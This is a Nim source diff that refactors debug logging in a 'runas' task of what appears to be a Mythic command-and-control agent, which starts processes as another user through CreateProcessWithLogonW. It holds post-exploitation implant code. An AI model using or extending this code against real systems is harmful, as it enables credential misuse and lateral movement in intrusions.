@@ -1,5 +1,5 @@
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import std/[json, strformat, strutils]
 
 when defined(windows):
@@ -8,8 +8,6 @@ when defined(windows):
 proc runas*(taskId: string, params: JsonNode): JsonNode =
   ## Execute a process as another user using CreateProcessWithLogonW
   ## This is similar to 'runas' command but programmatic
-  let cfg = getConfig()
-  
   when defined(windows):
     try:
       # Parse parameters
@@ -20,8 +18,7 @@ proc runas*(taskId: string, params: JsonNode): JsonNode =
       let args = params["args"].getStr()
       let netonly = params.getOrDefault("netonly").getBool(true)
       
-      if cfg.debug:
-        echo &"[DEBUG] RunAs: {domain}\\{username} executing {program}"
+      debug &"[DEBUG] RunAs: {domain}\\{username} executing {program}"
       
       var output = ""
       
@@ -53,12 +50,11 @@ proc runas*(taskId: string, params: JsonNode): JsonNode =
       let logonFlags: DWORD = if netonly: 0x2 else: 0x1
       let creationFlags: DWORD = CREATE_NEW_CONSOLE
       
-      if cfg.debug:
-        echo &"[DEBUG] Calling CreateProcessWithLogonW"
-        echo &"[DEBUG] Domain: {domain}"
-        echo &"[DEBUG] Username: {username}"
-        echo &"[DEBUG] Command: {commandLine}"
-        echo &"[DEBUG] NetOnly: {netonly}"
+      debug &"[DEBUG] Calling CreateProcessWithLogonW"
+      debug &"[DEBUG] Domain: {domain}"
+      debug &"[DEBUG] Username: {username}"
+      debug &"[DEBUG] Command: {commandLine}"
+      debug &"[DEBUG] NetOnly: {netonly}"
       
       # Call CreateProcessWithLogonW
       let result = CreateProcessWithLogonW(
@@ -113,8 +109,7 @@ proc runas*(taskId: string, params: JsonNode): JsonNode =
       CloseHandle(pi.hProcess)
       CloseHandle(pi.hThread)
       
-      if cfg.debug:
-        echo &"[DEBUG] Process created successfully with PID {actualPid}"
+      debug &"[DEBUG] Process created successfully with PID {actualPid}"
       
       return mythicSuccess(taskId, output)
       
